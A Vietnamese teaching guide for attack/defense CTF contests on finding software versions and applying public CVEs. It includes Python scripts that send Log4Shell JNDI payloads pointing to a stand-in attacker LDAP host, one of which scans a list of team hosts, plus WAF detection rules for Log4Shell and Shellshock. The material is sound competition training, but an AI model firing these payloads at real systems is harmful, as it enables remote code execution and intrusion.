00 / TÓM TẮT 1 PHÚT

CVE là gì, vì sao quan trọng trong A/D

CVE (Common Vulnerabilities and Exposures) là mã định danh công khai cho 1 lỗ hổng ĐÃ ĐƯỢC PHÁT HIỆN VÀ CÔNG BỐ trong 1 phần mềm cụ thể (vd CVE-2021-44228 = Log4Shell). Trong giải A/D, BTC thường triển khai service dựa trên phần mềm thật (WordPress, GitLab...) nhưng CỐ Ý dùng phiên bản cũ có lỗ hổng đã biết — mục tiêu của BTC không phải để bạn "tìm 0-day", mà để test khả năng NHẬN DIỆN phiên bản + TRA CỨU + ÁP DỤNG đúng exploit công khai, đúng kỹ năng thực tế của pentester.

Nếu chỉ nhớ một điều Luôn làm đúng thứ tự: (1) xác định CHÍNH XÁC tên phần mềm + số phiên bản trước, (2) MỚI tra CVE theo đúng phiên bản đó — tra CVE trước khi biết chắc phiên bản dễ dẫn tới thử sai exploit, mất thời gian.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

CVE ID — định dạng CVE-NĂM-SỐTHỨTỰ (vd CVE-2021-44228), mỗi mã gắn với 1 lỗ hổng cụ thể trong 1 phần mềm cụ thể, có mô tả công khai (thường tại nvd.nist.gov hoặc trang của chính dự án).
CVSS Score — điểm số 0-10 đánh giá mức độ nghiêm trọng của 1 CVE (10 = nguy hiểm nhất). Điểm cao không có nghĩa dễ khai thác — chỉ nghĩa là HẬU QUẢ nặng nếu khai thác được.
PoC (Proof of Concept) — mã khai thác mẫu, thường được public cùng/sau khi CVE được công bố, trên GitHub hoặc Exploit-DB — không phải luôn chạy "y nguyên", đôi khi cần chỉnh lại cho đúng target.
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Vì sao BTC dùng phần mềm cũ có CVE

Trong thực tế, tổ chức bị hack phần lớn vì CHẬM VÁ phần mềm đã có lỗ hổng công khai — không phải vì bị 0-day hiếm gặp. BTC mô phỏng đúng tình huống thực tế này: dựng service từ phần mềm/image Docker phiên bản cũ, test khả năng của thí sinh trong việc identify + apply đúng kiến thức công khai, kỹ năng CỰC KỲ thực dụng cho công việc pentest/AppSec sau này.

04 / NHẬN DIỆN PHIÊN BẢN — BƯỚC QUAN TRỌNG NHẤT

Nơi version hay "lộ" ra

  • Header response: Server, X-Powered-By, X-Generator.
  • File công khai: /CHANGELOG.md, /package.json, /composer.json, readme.html (WordPress), /help/ (GitLab hiện version ở footer trang help).
  • Comment trong HTML source, hoặc đường dẫn file JS/CSS có số version trong tên (app.1.2.3.min.js).
  • Trang lỗi/traceback (nếu debug mode bật) thường lộ cả tên framework + version trong stack trace.
05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Dùng Burp để soi header/response tìm version
  1. HTTP History → lọc xem TẤT CẢ response header của mọi request đã bắt — tìm X-Powered-By/Server lộ version.
  2. Thử truy cập trực tiếp các path hay lộ version (mục 04) qua Repeater.
  3. Sau khi có version, chuyển sang terminal dùng searchsploit (mục 07) — Burp không cần cho bước tra CVE/chạy exploit, chỉ hữu ích ở bước RECON này.

08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)

Ví dụ với Log4Shell (CVE-2021-44228) — minh hoạ quy trình chung

(A) Bản thủ công — để HIỂU từng bước

import requests

# Bước 1: gửi payload JNDI vào 1 header hay bị log lại (User-Agent, X-Api-Version...)
headers = {"X-Api-Version": "${jndi:ldap://YOUR_IP:1389/a}"}
requests.get("http://TARGET/", headers=headers, timeout=5)

# Bước 2: cần CHẠY SẴN 1 LDAP server giả (công cụ riêng, vd marshalsec hoặc JNDIExploit)
# ở YOUR_IP:1389 TRƯỚC khi gửi request này -- nếu target bị lỗi, nó sẽ kết nối ngược
# tới LDAP server giả, nhận class Java độc, thực thi RCE.

(B) Bản gọn chắc — fuzz nhiều header khả nghi cùng lúc

import requests

PAYLOAD = "${jndi:ldap://YOUR_IP:1389/a}"
HEADERS_TO_TRY = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer"]

def try_log4shell(host):
    for h in HEADERS_TO_TRY:
        try:
            requests.get(f"http://{host}/", headers={h: PAYLOAD}, timeout=5)
        except requests.RequestException:
            pass
    # Theo dõi LDAP listener riêng -- nếu thấy callback từ host này, xác nhận dính CVE-2021-44228

(C) Bản A/D tái dùng — quét toàn bộ teams.txt tìm ai còn dính CVE

import requests

PAYLOAD = "${jndi:ldap://YOUR_IP:1389/${hostName}}"  # {hostName} giúp phân biệt đội nào gọi về

def scan_log4shell(host):
    try:
        requests.get(f"http://{host}/", headers={"X-Api-Version": PAYLOAD}, timeout=5)
    except requests.RequestException:
        pass

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        scan_log4shell(host)
    # Xem log LDAP listener sau khi quét hết -- host nào gọi về là host đó còn dính lỗ hổng

10 / PHÒNG THỦ: VIẾT WAF RULE

Mỗi CVE cần rule riêng — không có rule chung

Rule ví dụKhớp gì
\$\{jndi: trong bất kỳ header nàoLog4Shell — payload JNDI rất đặc trưng, false positive gần 0
\(\)\s*\{.*:;\s*\} trong header (cú pháp function definition Bash)Shellshock — cú pháp function Bash cũng rất đặc trưng
Fix đúng nhất: PATCH, không phải WAFVới lỗ hổng known-CVE, WAF chỉ nên là lớp CHẶN TẠM trong lúc chưa patch được — giải pháp triệt để luôn là CẬP NHẬT PHIÊN BẢN phần mềm lên bản đã fix. Trong giải A/D (không patch được giữa giải vì ảnh hưởng service điểm SLA), WAF rule theo CVE cụ thể là lựa chọn thực tế duy nhất.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅Challenge dùng phần mềm/CMS/thư viện có tên + version xác định được, và version đó có CVE công khai còn áp dụng được.
❌Challenge dùng code TỰ VIẾT riêng cho giải (không phải phần mềm công khai nào) — tra CVE vô nghĩa, quay lại các bài lỗ hổng theo loại (SQLi, SSTI...).
❌Version phát hiện được đã PATCH đúng CVE nghi ngờ (kiểm tra kỹ changelog giữa các bản vá) — không nên cố thử exploit không khớp.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng 1 WordPress bằng Docker (image phiên bản cũ cụ thể, vd wordpress:5.7), tự xác định version qua readme.html, tra bằng searchsploit.

Gợi ý nếu kẹtdocker run -p 8080:80 wordpress:5.7 rồi truy cập http://localhost:8080/readme.html để xác nhận version hiển thị.

⭐⭐ Đổi 1 biến: thử lại với 1 version WordPress MỚI HƠN (đã patch), xác nhận searchsploit vẫn hiện kết quả cũ nhưng exploit đó KHÔNG còn áp dụng được — luyện kỹ năng đọc "Disclosure Date"/affected version range trong kết quả.

Gợi ý nếu kẹt./searchsploit -x <EDB-ID> thường ghi rõ "Vulnerable App" và version range ngay đầu file — đọc kỹ trước khi thử.

⭐⭐⭐⭐ Tự nghĩ: giải thích vì sao trong 1 trận A/D thật, việc GIẤU thông tin version (mục 10) lại đặc biệt quan trọng hơn so với 1 web bình thường ngoài đời — liên hệ tới việc ĐỐI THỦ của bạn cũng đang quét CVE trên CHÍNH SERVICE CỦA BẠN.

Gợi ý nếu kẹtTrong A/D, mọi đội chạy CÙNG 1 bản service — nếu đối thủ xác định được version nhanh hơn bạn fix/giấu, họ áp dụng CVE lên TOÀN BỘ service của mọi đội khác cùng lúc (không chỉ của bạn), nên việc giấu version giúp làm chậm, không phải chặn hoàn toàn.
